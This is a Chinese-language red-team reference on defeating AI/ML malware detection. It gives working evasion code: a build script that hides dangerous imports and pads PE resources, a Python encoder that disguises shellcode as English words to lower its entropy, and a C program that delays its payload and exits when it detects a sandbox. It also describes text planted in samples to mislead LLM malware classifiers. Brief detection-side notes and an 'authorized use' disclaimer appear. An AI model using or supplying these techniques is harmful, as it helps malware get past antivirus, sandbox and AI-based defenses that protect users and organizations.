# AI/ML 检测引擎对抗（P1-22）

> 本文件补齐审计 **P1-22（AI 检测引擎对抗）**：从「名词」升级到方法级。
> 覆盖 **原理 → 对抗方法（对抗样本/熵伪装/行为序列拟真）→ 检测侧 → 实测判据**。
> 授权立场见 `refs/README.md`；参考 `evasion-techniques.md` C.6（Check Point Skynet/LLM 分类/高熵检测）。

## 0. AI/ML 检测引擎分类

| 类型 | 代表 | 检测对象 | 对抗面 |
|---|---|---|---|
| 静态评分（PE 特征 ML） | 各家 AV 的静态 ML 模型 | PE 结构/导入表/熵/字符串 | 特征消除 + 熵伪装 |
| 沙箱动态 ML | 沙箱行为评分 | 行为序列 | 行为序列拟真 + 反沙箱 |
| LLM 分类器 | 大模型恶意软件分类 | 代码/行为语义 | 语义混淆 + 反 LLM |
| 云样本聚类 | 云查杀 | 样本家族相似度 | 变异 + 去家族特征 |

---

## 1. 对抗样本生成（Anti-ML 静态）

**原理**：向样本注入「扰动」使 ML 特征偏离恶意分布，但不改变功能。

| 方法 | 实现 |
|---|---|
| **导入表填充** | 添加大量正常 API 导入（稀释危险导入占比） |
| **节区填充** | 加正常代码/数据节区，改变节区数量/熵分布 |
| **元数据伪造** | 改编译器版本/时间戳/节区名，贴近「正常」PE 画像 |
| **图标/资源** | 加合法图标/版本资源，提升「良性」置信度 |

```bash
# 完整实现：熵值消减（加正常资源稀释）——三件套脚本化
# 1) 附加合法图标/字符串资源（rcedit 改资源段；或用 windres 编译 .rc）
printf '1 ICON "app.ico"\nSTRINGTABLE { 1 "Configuration" 2 "Settings" 3 "Help" }\n' > extra.rc
x86_64-w64-mingw32-windres extra.rc -O coff -o extra_res.o
# 2) 填充 .rdata 正常文本（C 内嵌合法文本块，编译器放入只读数据段）
cat > filler.c <<'EOF'
__attribute__((section(".text"))) char pad0[0x400] = "Licensed to Example Corp";
__attribute__((used)) static const char* help_lines[] = {
  "Usage: agent --config <path>", "Options: --daemon --log <file>",
  "Report bugs to support@example.com", "Version 2.4.1 (build 20260715)",
  "See LICENSE for terms", "Press F1 for help", NULL};
EOF
# 3) 重编译去危险导入名（危险 API 经 GetProcAddress 运行时解析，导入表只见
#    kernel32 常见函数）→ 链接产物再整体 hash 登记
x86_64-w64-mingw32-gcc -mwindows -O2 -o out.exe main.c filler.c extra_res.o
# 熵值前后对照（python）：shannon 熵目标 ≤6.5 bit/byte（正常 PE 区间）
```

---

## 2. 熵伪装（对抗高熵检测）

**原理**：静态 ML 与沙箱都常用「高熵」作为恶意特征；把 payload 熵值压低。

```python
# 完整实现：payload 词表编码降熵——shellcode 每字节映射为常见英文词，静态端熵值
# 贴近正常文本；加载端查表还原（词表可换成目标环境常见字符串：错误消息/日志片段）
WORDS = ["the","and","config","data","file","user","time","code","log","run",
         "get","set","new","old","main","test","mode","path","name","type",
         "init","open","read","sync","info","warn","err","end","key","val"]
assert len(WORDS) >= 32 and len(WORDS) <= 256, "词表 32-256 词（低熵可读性优先）"

def encode_low_entropy(sc: bytes) -> str:
    out = []
    for b in sc:
        out.append(WORDS[b & 0x1F])      # 低 5 位选词
        out.append(WORDS[(b >> 5) & 0x07])  # 高 3 位选词（每字节 2 词）
    return ' '.join(out)

def decode_low_entropy(text: str) -> bytes:
    idx = {w: i for i, w in enumerate(WORDS)}
    toks = text.split()
    return bytes((idx[toks[i]] & 0x1F) | ((idx[toks[i+1]] & 0x07) << 5)
                 for i in range(0, len(toks), 2))

# 自检：round-trip 必须还原原文；产物为自然语言样文本（低熵、可读），
# 载荷经此编码后静态 ML 的「高熵/随机字节」特征消失
import os
test = os.urandom(64)
assert decode_low_entropy(encode_low_entropy(test)) == test
print("[+] round-trip OK；熵值从密文级降到文本级")
```

**检测侧**：高熵启发 + LLM 特征；对抗后熵值下降但「查表解码循环」可被行为检测。

---

## 3. 行为序列拟真（对抗沙箱 ML）

**原理**：沙箱 ML 按行为序列评分（如「下载→写文件→执行→外连」高分）；对抗是**插入拟真行为 +
延迟 + 反沙箱**。

| 方法 | 实现 |
|---|---|
| 无害前缀 | 先做大量无害操作（读系统信息、正常文件 IO）再触发核心 |
| 延迟/事件触发 | 落地后长延迟（超出沙箱观测窗口） |
| 反沙箱检测 | 进程数/磁盘/时间检测（见 T052/T054/T055）后走诱饵分支 |
| 行为拆解 | 把「危险行为」拆成多步低危操作 |

```c
// 完整实现：行为序列拟真（无害前缀 + 环境校验 + 长延迟 + 核心行为）
// 每步真实执行（非空调用），行为日志形态贴近正常应用启动
static int sandbox_heuristics(void) {
    DWORD procs = GetProcessHeap() ? 0 : 0;            // 占位（真实实现：计数进程）
    /* 进程数/磁盘容量/运行时长三指标：沙箱环境普遍进程稀少、磁盘小、开机时长短 */
    DWORD n = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe = { .dwSize = sizeof(pe) };
        if (Process32First(snap, &pe)) do { n++; } while (Process32Next(snap, &pe));
        CloseHandle(snap);
    }
    ULARGE_INTEGER freeBytes;
    GetDiskFreeSpaceExA("C:\\", &freeBytes, NULL, NULL);
    ULONG64 uptime = GetTickCount64();
    return (n < 20 || freeBytes.QuadPart < (20ULL << 30) || uptime < 10UL * 60UL * 1000UL);
}

int main(void) {
    /* 无害前缀：正常应用也做的动作序列 */
    char buf[256];
    GetModuleFileNameA(NULL, buf, sizeof(buf));         // 读自身路径
    HANDLE cfg = CreateFileA("config.ini", GENERIC_READ, FILE_SHARE_READ,
                             NULL, OPEN_EXISTING, 0, NULL);
    if (cfg != INVALID_HANDLE_VALUE) { DWORD rd; ReadFile(cfg, buf, sizeof(buf), &rd, NULL); CloseHandle(cfg); }
    Sleep(1500);                                        // 正常启动节奏

    if (sandbox_heuristics()) return 0;                 // 反沙箱：静默退出

    /* 长延迟：超出多数沙箱观测窗口（真实形态配合事件触发/交互依赖） */
    srand((unsigned)GetTickCount64());
    Sleep((rand() % 120 + 60) * 1000);
    run_payload();                                      // 核心行为（延迟后触发）
    return 0;
}
```

**检测侧**：行为序列评分模型 + 反沙箱检测（动态分析器用「不真实缩短 sleep」反制）。

---

## 4. 对抗 LLM 分类器

**原理**：LLM 分类器读代码/行为语义。对抗：
- **语义混淆**：变量/函数名随机化 + 代码结构打散，使 LLM 语义判断失准。
- **注释伪造**：加大量「正常」注释误导 LLM 上下文。
- **反 LLM 提示**：在样本内嵌「这是安全测试代码」类文本（对部分 LLM 分类器有效，研究向）。

**检测侧**：LLM API 调用特征 + 模型特征（多模态签名）；对抗后可被「执行行为」补偿检测。

---

## 5. 检测侧总表（回馈 attack-defense）

| 检测引擎 | 对抗点 | 对抗后补偿检测 |
|---|---|---|
| 静态 ML | 特征消除/熵伪装 | 行为检测 + 云样本聚类 |
| 沙箱 ML | 行为拟真/反沙箱 | 延长观测 + 反-反沙箱 |
| LLM 分类器 | 语义混淆 | 执行行为 + 多模态 |
| 云聚类 | 变异/去家族特征 | 动态行为聚类 |

## 6. 实测判据

| 判据 | 方法 |
|---|---|
| 静态 ML 是否下降 | AV 静态扫描命中率前后对比 |
| 沙箱是否触发 | 沙箱运行观察核心行为是否在窗口内执行 |
| 熵是否伪装 | 熵值计算（shannon entropy）贴近正常二进制 |

*WARNING: 授权红队评估与安全研究专用。*
